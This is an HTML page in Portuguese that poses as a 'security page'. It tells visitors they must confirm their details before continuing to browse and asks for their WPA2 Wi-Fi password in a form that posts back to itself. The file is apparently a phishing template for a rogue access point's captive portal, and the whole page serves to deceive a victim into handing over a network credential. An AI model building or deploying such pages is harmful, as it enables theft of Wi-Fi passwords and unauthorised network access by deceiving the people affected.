<html>
    <head>
        <meta charset="UTF-8" />
        <title>Pagina de segurança</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link rel="stylesheet" type="text/css" href="style.css" />


    </head>

<body>
    <div class="container" >
        <a class="links" id="paracadastro"></a>
        <a class="links" id="paralogin"></a>
         
        <div class="content">      
          <!--FORMULÁRIO DE LOGIN-->
          <div id="login">
            <form method="post" action=""> 
              <h1>PÁGINA DE SEGURANÇA</h1> 
                      
              <p> 
                <label for="email_login">Precisamos que você confirme alguns dados antes de continuar navegando.</label> </br> </br>
                <label for="email_login">Confirme a senha WPA2 (senha do Wifi)</label>
                <input id="email_login" name="email_login" required="required" type="password" placeholder="digite a senha" /> 
              </p>
                                          
              <p> 
                <input type="submit" value="Continuar" /> 
              </p>
               
              
            </form>
          </div>
        </div>
      </div>
</body>
</html>
